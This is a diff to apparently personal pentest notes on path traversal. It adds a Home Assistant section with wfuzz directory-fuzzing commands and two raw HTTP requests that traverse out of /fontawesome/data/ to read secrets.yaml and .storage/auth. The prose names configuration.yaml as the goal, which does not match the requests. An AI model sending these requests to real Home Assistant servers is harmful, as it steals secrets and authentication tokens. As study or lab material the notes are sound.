@@ -119,3 +119,40 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://dirTravS
 wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh 81,125 http://dirTravSandbox/relativePathing.php?path=../../../../../../../../../../../../FUZZ
 
 ```
+
+###### Home Assistant
+
+```
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://homeassistant:8123/FUZZ
+
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://homeassistant:8123/fontawesome/FUZZ
+
+```
+
+we'll now modify anything past /data/ to traverse out of the fas.js file's location on the target machine. We will move one directory at a time until we arrive at configuration.yaml.
+
+
+```
+GET /fontawesome/data/../../../secrets.yaml HTTP/1.1
+Host: homeassistant:8123
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+```
+
+```
+GET /fontawesome/data/../../../.storage/auth HTTP/1.1
+Host: homeassistant:8123
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+```
+
